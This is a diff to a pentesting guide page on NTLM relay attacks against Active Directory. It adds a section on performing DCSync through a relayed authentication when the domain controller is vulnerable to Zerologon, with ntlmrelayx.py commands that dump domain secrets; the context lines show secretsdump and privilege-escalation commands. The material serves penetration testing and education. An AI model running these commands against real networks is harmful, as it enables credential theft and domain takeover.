@@ -104,7 +104,7 @@ proxychains secretsdump.py -no-pass $DOMAIN/$USER@$TARGET
 ```
 {% endtab %}
 
-{% tab title="Domain dump" %}
+{% tab title="Domain enum" %}
 The following command will run an enumeration of the Active Directory domain through the relayed authenticated session. The operation will create multiple `.html`, `.json` and `.grep` files.
 
 ```bash
@@ -156,6 +156,18 @@ ntlmrelayx.py -t ldaps://$DOMAIN_CONTROLLER --escalate-user SHUTDOWN
 {% hint style="info" %}
 This technique is usually combined with a [PushSubscription abuse \(a.k.a. PrivExchange\)](../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange) to force an Exchange server to initiate an authentication, relay it to a domain controller and abuse the default high privileges of Exchange servers in AD domains \(`WriteDACL` over domain object, see [Abusing ACEs](../abusing-aces/)\) to escalate a domain user privileges \(`--escalate-user`\).
 {% endhint %}
+{% endtab %}
+
+{% tab title="DCSync" %}
+A [DCSync](../credentials/dumping/dcsync.md) can also be operated with a relayed NTLM authentication, but only if the target domain controller is vulnerable to [Zerologon](../frontal-attacks-2/zerologon.md) since the DRSUAPI always requires signing.
+
+```bash
+# target vulnerable to Zerologon, dump DC's secrets only
+ntlmrelayx.py -t dcsync://'DOMAINCONTROLLER'
+
+# target vulnerable to Zerologon, dump Domain's secrets
+ntlmrelayx.py -t dcsync://'DOMAINCONTROLLER' -auth-smb 'DOMAIN'/'LOW_PRIV_USER':'PASSWORD'
+```
 {% endtab %}
 {% endtabs %}
 
